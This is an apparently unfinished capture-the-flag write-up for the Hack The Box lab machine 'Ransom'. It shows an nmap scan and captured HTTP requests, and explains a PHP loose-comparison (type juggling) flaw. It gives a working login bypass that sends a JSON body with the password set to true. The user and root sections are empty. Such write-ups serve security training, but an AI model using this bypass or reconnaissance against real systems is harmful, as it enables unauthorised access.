# Ransom

# Enumeration

````
# nmap -sV --top-ports 100 10.10.11.153 -oA nmap-10.10.11.153-sV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-17 06:13 EDT
Nmap scan report for 10.10.11.153
Host is up (0.15s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
````

The application sends a GET request to /api/login?password=<passwd> to login in the application.

````http
GET /api/login?password=blah HTTP/1.1
Host: ransom.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://ransom.htb/login
Cookie: XSRF-TOKEN=eyJpdiI6Im9zRXJmTDJMbG1EZW1iT0IxcG5tV2c9PSIsInZhbHVlIjoiU3phYktmZTA3YW9jN0dITmZzTGJ3SFp4d1hONjNlZFhPdVNMNmI2MTF6elkvbSs3bllVUHQwMEYwUE9HN1l4VXpnZjhPZ0IycGlMUlk0VmN6YWR2N243RjJmQ0YxZW5JZi82dW5hbk16WVlSQWhnNXE2djREaERmd1FxLzZneS8iLCJtYWMiOiI5ZmIxYjhmMmFhOWNlMThhNjAxNTQ4NzIxYmZmZGViNGMwMDYxNTdhOGNhY2UxNDVhNzA1OGM0N2ZjYWFkNTY1IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlcrQ1lmQXJYa3NNL3dOejVDTW9BVVE9PSIsInZhbHVlIjoidlJ3YmJGY241TmlibUlPVjFPOWlUelRUMWE4QVVVWGRhZlhKZnR4QXNTcUg3UDNoRWZNNGVKOGpCbnJUSFBOUy8rZk1JOHBCVEVpbkZHa3Q4bWV1K2tvUUI5M2FMTTFSTTNabjVuaE5VdDEvRUcvMHBPdUVQK0JYZ0luREtCMkgiLCJtYWMiOiJmNTAzNjE2YjNhYTgxODY1ZTVjMTc0M2ExMDA5ZTA5MWNhZGNhODc5M2JhOGFmMjk0YzE1MzI5NDA5YzFjNTVmIiwidGFnIjoiIn0%3D


````

There is a [Type Juggling == vs ===](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf) vulnerability in the application that can be exploited.

The application allows GET and HEAD method but also allows JSON on body, changing the password to TRUE (or 0) would make the internal comparision on php match.
  
````http
GET /api/login HTTP/1.1
Host: ransom.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://ransom.htb/login
Cookie: XSRF-TOKEN=eyJpdiI6Im9zRXJmTDJMbG1EZW1iT0IxcG5tV2c9PSIsInZhbHVlIjoiU3phYktmZTA3YW9jN0dITmZzTGJ3SFp4d1hONjNlZFhPdVNMNmI2MTF6elkvbSs3bllVUHQwMEYwUE9HN1l4VXpnZjhPZ0IycGlMUlk0VmN6YWR2N243RjJmQ0YxZW5JZi82dW5hbk16WVlSQWhnNXE2djREaERmd1FxLzZneS8iLCJtYWMiOiI5ZmIxYjhmMmFhOWNlMThhNjAxNTQ4NzIxYmZmZGViNGMwMDYxNTdhOGNhY2UxNDVhNzA1OGM0N2ZjYWFkNTY1IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlcrQ1lmQXJYa3NNL3dOejVDTW9BVVE9PSIsInZhbHVlIjoidlJ3YmJGY241TmlibUlPVjFPOWlUelRUMWE4QVVVWGRhZlhKZnR4QXNTcUg3UDNoRWZNNGVKOGpCbnJUSFBOUy8rZk1JOHBCVEVpbkZHa3Q4bWV1K2tvUUI5M2FMTTFSTTNabjVuaE5VdDEvRUcvMHBPdUVQK0JYZ0luREtCMkgiLCJtYWMiOiJmNTAzNjE2YjNhYTgxODY1ZTVjMTc0M2ExMDA5ZTA5MWNhZGNhODc5M2JhOGFmMjk0YzE1MzI5NDA5YzFjNTVmIiwidGFnIjoiIn0%3D
Content-Type: application/json
Content-Length: 18

{ "password":true}
````


  
# User

# Root

# Secrets
  
https://0xdf.gitlab.io/2022/03/15/htb-ransom.html
